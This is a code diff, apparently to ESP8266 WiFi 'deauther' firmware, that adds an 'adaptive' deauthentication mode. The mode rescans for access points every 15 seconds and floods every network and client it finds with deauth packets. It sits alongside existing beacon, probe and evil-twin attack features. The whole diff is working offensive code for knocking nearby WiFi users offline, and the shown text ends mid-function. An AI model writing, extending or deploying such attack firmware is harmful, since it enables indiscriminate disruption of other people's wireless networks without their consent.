@@ -34,18 +34,17 @@ void Attack::start() {
     running = true;
 }
 
-void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
-    Attack::beacon.active = beacon;
-    Attack::deauth.active = deauth || deauthAll;
-    Attack::deauthAll     = deauthAll;
-    Attack::probe.active  = probe;
+void Attack::start(bool beacon, bool deauth, bool deauthAll, bool deauthAdaptive, bool probe, bool output, uint32_t timeout) {
+    Attack::beacon.active        = beacon;
+    Attack::deauth.active        = deauth || deauthAll || deauthAdaptive;
+    Attack::deauthAll            = deauthAll;
+    Attack::deauthAdaptive       = deauthAdaptive;
+    Attack::probe.active         = probe;
 
     Attack::output  = output;
     Attack::timeout = timeout;
 
-    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
-    // scan.countSelected() > 0)){
-    if (beacon || probe || deauthAll || deauth || !EvilTwin::isRunning()) {
+    if (beacon || probe || deauthAll || deauth || deauthAdaptive || !EvilTwin::isRunning()) {
         start();
     } else {
         prntln(A_NO_MODE_ERROR);
@@ -75,6 +74,9 @@ void Attack::stop() {
         deauth.active        = false;
         beacon.active        = false;
         probe.active         = false;
+        deauthAdaptive       = false;
+        lastRescanTime       = 0;
+        rescanPending        = false;
         prntln(A_STOP);
     }
 }
@@ -93,7 +95,7 @@ void Attack::updateCounter() {
 
     // deauth packets per second
     if (deauth.active) {
-        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
+        if (deauthAll || deauthAdaptive) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                                         (accesspoints.count() + stations.count() * 2 - names.selected());
         else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                               (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
@@ -154,41 +156,59 @@ String Attack::getStatusJSON() {
             String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
     json += String(OPEN_BRACKET) + b2s(EvilTwin::isRunning()) + String(COMMA) + String(DOUBLEQUOTES) + String(
         scan.getEndSSID()) + String(DOUBLEQUOTES) + String(CLOSE_BRACKET) + String(COMMA);                       // [false,"SSID"],
+    json += String(OPEN_BRACKET) + b2s(deauthAdaptive) + String(COMMA) + String(accesspoints.count()) + String(COMMA) +
+            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
     json += String(packetRate);                                                                                  // 0
     json += CLOSE_BRACKET;                                                                                       // ]
     return json;
 }
 
 void Attack::update() {
-    if (!running || scan.isScanning()) return;
+    if (!running) return;
 
+    // === DEAUTH ADAPTIVE: auto-rescan tiap 15s ===
+    // Note: keepExisting=FALSE, jadi list di-removeAll tiap rescan.
+    // Ini mencegah crash karena id selalu fresh dari scan baru.
+    if (deauthAdaptive && !rescanPending && !scan.isScanning()) {
+        if (lastRescanTime == 0 || (currentTime - lastRescanTime) >= 15000) {
+            rescanPending = true;
+            lastRescanTime = currentTime;
+        }
+    }
+
+    // Mulai scan AP 3s (keepExisting default = false)
+    if (rescanPending && !scan.isScanning()) {
+        prntln("AsungX: adaptive rescan (AP 3s)");
+        scan.start(SCAN_MODE_APS, 3000, SCAN_MODE_OFF, 0, true, wifi_channel);
+        rescanPending = false;
+        return;
+    }
+
+    // Skip tick kalau scan sedang jalan (radio single-channel)
+    if (scan.isScanning()) return;
+
+    // Refresh count SETELAH scan selesai (list fresh dari scan baru)
     apCount = accesspoints.count();
     stCount = stations.count();
     nCount  = names.count();
 
-    // 🔧 PATCH v3: clamp deauth.tc biar tidak out-of-bounds saat list berubah
-    if (deauth.tc >= (apCount + stCount + nCount)) {
-        deauth.tc = 0;
-    }
+    if (deauth.tc >= (apCount + stCount + nCount)) deauth.tc = 0;
 
-    // run/update all attacks
     deauthUpdate();
     deauthAllUpdate();
     beaconUpdate();
     probeUpdate();
 
-    // each second
     if (currentTime - attackTime > 1000) {
-        attackTime = currentTime; // update time
+        attackTime = currentTime;
         updateCounter();
-
-        if (output) status();     // status update
-        getRandomMac(mac);        // generate new random mac
+        if (output) status();
+        getRandomMac(mac);
     }
 }
 
 void Attack::deauthUpdate() {
-    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
+    if (!deauthAll && !deauthAdaptive && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
         if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
             // APs
             if ((apCount > 0) && (deauth.tc < apCount)) {
@@ -218,10 +238,11 @@ void Attack::deauthUpdate() {
 }
 
 void Attack::deauthAllUpdate() {
-    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
+    if ((deauthAll || deauthAdaptive) && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
         if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
-            // APs
-            if ((apCount > 0) && (deauth.tc < apCount)) {
+            // APs — pakai count() LIVE untuk dynamic deauth
+            uint8_t liveApCount = accesspoints.count();
+            if ((liveApCount > 0) && (deauth.tc < liveApCount)) {
                 tmpID = names.findID(accesspoints.getMac(deauth.tc));
 
                 if (tmpID < 0) {
